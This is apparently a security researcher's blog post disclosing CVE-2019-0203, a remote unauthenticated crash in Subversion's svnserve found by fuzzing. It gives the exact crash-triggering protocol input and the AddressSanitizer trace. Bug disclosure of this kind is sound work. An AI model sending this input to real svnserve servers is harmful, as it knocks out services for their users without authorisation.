---
layout: post
title:  "svnserve unauthenticated remote null-pointer-dereference"
date:   2019-09-14 11:33:37 +0100
categories: bug
---


[CVE-2019-0203](http://subversion.apache.org/security/CVE-2019-0203-advisory.txt)

[DSA-4490-1](https://www.debian.org/security/2019/dsa-4490)

[USN-4082-1](https://usn.ubuntu.com/4082-1/)

Bug found using honggfuzz.

*Input:*
```
( 2 ( edit-pipeline svndiff1 absent-entries depth mergeinfo log-revprops ) 50:svn://127.0.0.1/home/osboxes/subversion/repos 31:SVN/1.9.5 (x86_64-pc-linux-gnu) ( ) ) ( ANONYMOUS ( 29:YW5vbnltb3VzQGRlYmlhbi10b20=
 ) ) ( get-latest-rev ( ) ) ( reparent ( 50:svn://127.0.0.1/home/osboxes/subversion/repos ) ) ( get-latest-rev ( ) ) ( get-latest-rev ( ) ) ( log ( ( 0: ) ( 0 ) ( 0 ) false false 0 false revprops ( 10:svn:author 8:svn:date 7:svn:log ) ) )
```

*Output:*
```
12633 2019-02-08T09:55:41.422128Z 127.0.0.1 - - ERR - 0 125002 Non-svn URL passed to svn server: '50:svn://127.0.0.1/home/osboxes/subversion/repos'
ASAN:DEADLYSIGNAL
=================================================================
==12633==ERROR: AddressSanitizer: SEGV on unknown address 0x00000000 (pc 0x0050c027 bp 0x17fece16 sp 0xbff670a0 T0)
    #0 0x50c026 in get_latest_rev subversion/svnserve/serve.c:1142
    #1 0xf9ac0a in svn_ra_svn__handle_command subversion/libsvn_ra_svn/marshal.c:1945
    #2 0x53532f in serve_interruptable subversion/svnserve/serve.c:4396
    #3 0x4d250a in serve_socket subversion/svnserve/svnserve.c:693
    #4 0x4f805d in sub_main subversion/svnserve/svnserve.c:1434
    #5 0x4f805d in main subversion/svnserve/svnserve.c:1505
    #6 0xb6f60285 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18285)
    #7 0x4fc69f  (/home/osboxes/subversion/subversion/svnserve/svnserve+0x5f69f)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV subversion/svnserve/serve.c:1142 in get_latest_rev
==12633==ABORTING
```
